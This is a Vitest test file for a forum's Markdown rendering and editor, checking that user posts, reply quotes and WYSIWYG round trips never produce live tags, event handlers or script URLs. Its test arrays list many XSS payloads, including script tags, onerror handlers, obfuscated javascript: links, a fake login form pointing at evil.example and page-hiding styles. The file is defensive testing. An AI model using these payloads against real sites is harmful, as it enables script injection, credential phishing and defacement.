import { createRequire } from 'node:module'
import { pathToFileURL } from 'node:url'
import { beforeAll, describe, expect, it } from 'vitest'
import { postExcerpt } from '~/utils/excerpt'
import { fromEditor, isUnsafeDestination, renderableMarkdown, replyQuote, toEditor, WORD_JOINER } from '../shared/post-markdown'

// TxMarkdownView renders with `new Marked({ gfm: true, breaks: true })`. The
// forum does not depend on marked itself, so resolve the very copy tuffex
// ships and run the text through the same parser the page uses.
interface MarkedLike { parse: (source: string) => string }
let marked: MarkedLike

beforeAll(async () => {
  const fromForum = createRequire(import.meta.url)
  const fromTuffex = createRequire(fromForum.resolve('@talex-touch/tuffex/package.json'))
  const module = await import(pathToFileURL(fromTuffex.resolve('marked')).href) as { Marked: new (options: object) => MarkedLike }
  marked = new module.Marked({ gfm: true, breaks: true })
})

function html(source: string): string {
  return marked.parse(renderableMarkdown(source))
}

/**
 * The rendered HTML with every quoted attribute value blanked (marked always
 * double-quotes them), so text inside a value such as a title or an alt,
 * `title="t&quot; onmouseover=…"`, never reads as an attribute of its own.
 */
function outsideValues(out: string): string {
  return out.replace(/="[^"]*"/g, '=""')
}

/** Tags a post can never produce once rendered, whatever it contains. */
const FORBIDDEN_TAG = /<(?:script|style|iframe|object|embed|form|input|button|textarea|svg|math|link|meta|base|div|span|details|table)\b/i

const ATTACKS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<style>body{display:none}</style>',
  '<div style="position:fixed;inset:0">点这里重新登录</div>',
  '<iframe src="https://evil.example"></iframe>',
  '<!-- hidden --><b>bold</b>',
  '<svg onload=alert(1)>',
  '<form action="https://evil.example"><input name=p><button>登录</button></form>',
  'text <span onclick="alert(1)">inline</span> text',
  '- item\n\n  <details open><summary>x</summary></details>',
  '> quote\n<style>*{color:red}</style>',
  '```\ncode\n```~\n<style>x</style>',
  'a `\n<script>alert(1)</script>` b',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '</p><script>alert(1)</script>',
  '<?php echo 1 ?>',
  '<![CDATA[<script>alert(1)</script>]]>',
  '<a href="javascript:alert(1)">点我</a>',
  '<img src="javascript:alert(1)">',
  '<IMG SRC=vbscript:msgbox(1)>',
  '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" onerror=alert(1)>',
  '<img src="https://s2.loli.net/a.png" onerror="alert(1)" onload=alert(2)>',
  '<body onload=alert(1)>',
  '<video><source onerror="alert(1)"></video>',
  '[x](https://example.invalid "t\\" onmouseover=\\"alert(1)")',
]

describe('raw HTML in a post is shown as text', () => {
  it.each(ATTACKS)('%j renders no tag and no event handler', (source) => {
    const out = html(source)
    expect(out).not.toMatch(FORBIDDEN_TAG)
    // Handler text may survive as visible text (&lt;span onclick=…); never inside a real tag.
    expect(outsideValues(out)).not.toMatch(/<[a-z][^>]*\son\w+=/i)
    expect(outsideValues(out)).not.toMatch(/<[a-z][^>]*\sstyle=/i)
  })

  it('keeps the text readable: only an invisible word joiner follows the <', () => {
    expect(renderableMarkdown('<b>x</b>')).toBe(`<${WORD_JOINER}b>x<${WORD_JOINER}/b>`)
    expect(html('<b>x</b>')).toContain(`&lt;${WORD_JOINER}b&gt;x`)
  })

  it('shows code as written, in fences and inline', () => {
    const fenced = html('```c\n#include <stdio.h>\nint main() { return a < b; }\n```')
    expect(fenced).toContain(`#include &lt;${WORD_JOINER}stdio.h&gt;`)
    expect(fenced).toContain('return a &lt; b;')
    expect(html('用 `List<String>` 就行')).toContain(`<code>List&lt;${WORD_JOINER}String&gt;</code>`)
  })

  it('leaves a comparison, an arrow and an autolink alone', () => {
    expect(renderableMarkdown('a < b, 1<2, <- back')).toBe('a < b, 1<2, <- back')
    expect(html('<https://github.com/Yangtze-University-Geek-Class>')).toContain('<a href="https://github.com/Yangtze-University-Geek-Class">')
    expect(html('<mailto:hi@example.invalid>')).toContain('href="mailto:hi@example.invalid"')
  })

  it('turns a Typora-style <img> into a Markdown image and drops its style', () => {
    const source = '<img src="../published/f233bcfcb446e028.webp" alt="image-20230925211333855" style="zoom: 33%;" />'
    expect(renderableMarkdown(source)).toBe('![image-20230925211333855](../published/f233bcfcb446e028.webp)')
    expect(html(source)).toContain('<img src="../published/f233bcfcb446e028.webp" alt="image-20230925211333855">')
    // An alt that tries to close the image and open a link stays alt text.
    const sneaky = html('<img src="https://s2.loli.net/a.png" alt="a](javascript:alert(1))">')
    expect(sneaky).toMatch(/^<p><img src="https:\/\/s2\.loli\.net\/a\.png" alt="[^"]*"><\/p>\n$/)
    expect(sneaky).not.toMatch(/(?:href|src)="[^"]*javascript/i)
  })

  it('does not convert <img> inside code', () => {
    expect(renderableMarkdown('```html\n<img src="a.png">\n```')).toBe(`\`\`\`html\n<${WORD_JOINER}img src="a.png">\n\`\`\``)
    expect(renderableMarkdown('写成 `<img src="a.png">` 就行')).toBe(`写成 \`<${WORD_JOINER}img src="a.png">\` 就行`)
  })
})

describe('links and images only go to http(s), mailto or the site itself', () => {
  const BLOCKED = [
    '[点我](javascript:alert(1))',
    '[点我]( JaVaScRiPt:alert(1))',
    '[点我](java&#115;cript:alert(1))',
    '[点我](java&#x73;cript&colon;alert(1))',
    '[点我](jav&#x09;ascript:alert(1))',
    '[点我](<javascript:alert(1)>)',
    '[点我](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
    '[点我](vbscript:msgbox(1))',
    '![图](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)',
    '[点我][x]\n\n[x]: javascript:alert(1)',
    '[点我][x]\n\n[x]:\n  javascript:alert(1)',
    '> [点我][x]\n>\n> [x]: data:text/html,x',
    '![图](javascript:alert(1))',
    '![图](vbscript:msgbox(1))',
    '![图]( data:text/html,x)',
    '<img src="javascript:alert(1)" alt="x">',
    '<img src=" data:image/png;base64,AAAA">',
  ]

  it.each(BLOCKED)('%j renders no dangerous href or src', (source) => {
    const out = html(source)
    expect(out).not.toMatch(/(?:href|src)="\s*(?:javascript|data|vbscript):/i)
    expect(out).not.toMatch(/(?:href|src)="[^"#]*(?:javascript|vbscript)/i)
  })

  it('turns a blocked address into an in-page anchor', () => {
    expect(renderableMarkdown('[a](javascript:alert(1))')).toBe('[a](#javascript:alert(1))')
    expect(html('[a](javascript:alert(1))')).toContain('href="#javascript:alert(1)"')
  })

  it('keeps ordinary links working', () => {
    expect(html('[文档](https://example.invalid/docs)')).toContain('href="https://example.invalid/docs"')
    expect(html('[写信](mailto:hi@example.invalid)')).toContain('href="mailto:hi@example.invalid"')
    expect(html('[下一篇](./t72)')).toContain('href="./t72"')
    expect(html('[楼上](#post-p10001)')).toContain('href="#post-p10001"')
    expect(html('![截图](../published/abc.webp)')).toContain('src="../published/abc.webp"')
  })

  it('keeps a title that pretends to open an attribute inside the title', () => {
    expect(html('[x](https://example.invalid "t\\" onmouseover=\\"alert(1)")')).toContain('title="t&quot; onmouseover=&quot;alert(1)"')
  })

  it('never lets a guest post produce an event handler or a script address, whatever the input', () => {
    for (const source of [...ATTACKS, ...BLOCKED]) {
      const out = html(source)
      expect(outsideValues(out), source).not.toMatch(/<[a-z][^>]*\son\w+\s*=/i)
      expect(out, source).not.toMatch(/<(?:script|iframe|object|embed|svg|form)\b/i)
      expect(out, source).not.toMatch(/(?:href|src)\s*=\s*"\s*(?:javascript|data|vbscript):/i)
    }
  })

  it('classifies destinations the way a browser reads them', () => {
    expect(isUnsafeDestination('javascript:x')).toBe(true)
    expect(isUnsafeDestination('\\javascript:x')).toBe(true)
    expect(isUnsafeDestination('&#106avascript:x')).toBe(true)
    expect(isUnsafeDestination('https://x')).toBe(false)
    expect(isUnsafeDestination('/forum/t/t73')).toBe(false)
    expect(isUnsafeDestination('t73')).toBe(false)
    expect(isUnsafeDestination('')).toBe(false)
  })
})

/**
 * TxMarkdownEditor renders its value with marked (gfm, breaks) and DOMPurify's default profile into a
 * WYSIWYG layer and a preview layer that stay in the DOM behind v-show, even in source mode. That profile
 * keeps <style>, <form>, <input> and style attributes, so a guest's `<style>body{display:none}</style>`
 * quoted into a reply would hide the whole page. DOMPurify only ever removes, so a tag that is not in
 * marked's output is not in the editor's DOM either.
 */
/** HTML written with character entities: shown as text in a post, but the editor's WYSIWYG layer decodes them. */
const ENTITY_ATTACKS = [
  '&lt;style&gt;body{display:none}&lt;/style&gt;',
  '&#60;form action="https://evil.example"&#62;&#60;input type=password&#62;&#60;/form&#62;',
  '&#x3c;style&#x3e;*{color:red}&#x3C;/style&#x3E;',
  '&LT;img src=x onerror=alert(1)&GT;',
  '> 引用 &lt;style&gt;body{display:none}&lt;/style&gt;',
]

/**
 * What the editor writes back after its WYSIWYG layer: tuffex's `serializeMarkdown` takes each text node's
 * `textContent`, entities already decoded, and writes it as-is (it only escapes Markdown punctuation, never
 * `<` or `&`). Enough of that here to see a tag come back: drop the tags, decode the entities.
 */
function wysiwygRoundTrip(value: string): string {
  return marked.parse(value)
    .replace(/<[^>]*>/g, '')
    .replace(/&#x([0-9a-f]+);/gi, (_, hex: string) => String.fromCodePoint(Number.parseInt(hex, 16)))
    .replace(/&#(\d+);/g, (_, dec: string) => String.fromCodePoint(Number(dec)))
    .replace(/&(lt|gt|quot|#39|amp);/gi, (_, name: string) => ({ lt: '<', gt: '>', quot: '"', '#39': '\'', amp: '&' })[name.toLowerCase()] ?? '')
}

describe('someone else\'s text put into the editor', () => {
  /** ReplyComposer's QUOTE_LENGTH. */
  const QUOTE_LENGTH = 80

  it('is what the raw text would put on the page (the case this guards)', () => {
    expect(marked.parse(`> ${postExcerpt('<style>body{display:none}</style>', QUOTE_LENGTH)}\n\n`)).toMatch(/<style>/)
  })

  it.each(ATTACKS)('quoting %j puts no tag, handler or style into the editor', (source) => {
    const out = marked.parse(replyQuote(postExcerpt(source, QUOTE_LENGTH)))
    expect(out).not.toMatch(FORBIDDEN_TAG)
    expect(outsideValues(out)).not.toMatch(/<[a-z][^>]*\s(?:on\w+|style)=/i)
  })

  it.each(ATTACKS)('editing %j puts no tag, handler or style into the editor', (source) => {
    const out = marked.parse(toEditor(source))
    expect(out).not.toMatch(FORBIDDEN_TAG)
    expect(outsideValues(out)).not.toMatch(/<[a-z][^>]*\s(?:on\w+|style)=/i)
  })

  it('is what the entities would turn into after a trip through the WYSIWYG layer (the case this guards)', () => {
    expect(marked.parse(wysiwygRoundTrip(ENTITY_ATTACKS[0] as string))).toMatch(/<style>/)
  })

  it.each([...ATTACKS, ...ENTITY_ATTACKS])('%j stays text after a trip through the WYSIWYG layer, edited or quoted', (source) => {
    for (const value of [toEditor(source), replyQuote(postExcerpt(source, QUOTE_LENGTH))]) {
      const out = marked.parse(wysiwygRoundTrip(value))
      expect(out).not.toMatch(FORBIDDEN_TAG)
      expect(outsideValues(out)).not.toMatch(/<[a-z][^>]*\s(?:on\w+|style)=/i)
    }
  })

  it('saves exactly what the author left, without the inserted word joiners', () => {
    for (const source of [...ATTACKS, ...ENTITY_ATTACKS, '#include <stdio.h>', 'a < b', '<https://example.com>', 'AT&T &amp; R&D'])
      expect(fromEditor(toEditor(source))).toBe(source)
    expect(fromEditor(`${replyQuote('<b>x</b>')}我的回复`)).toBe('> <b>x</b>\n\n我的回复')
  })

  it('keeps a word joiner the author wrote', () => {
    const source = `词${WORD_JOINER}语 <b>x</b>`
    expect(fromEditor(toEditor(source))).toBe(source)
    expect(fromEditor(`${toEditor(source)}，改了一句`)).toBe(`${source}，改了一句`)
  })
})
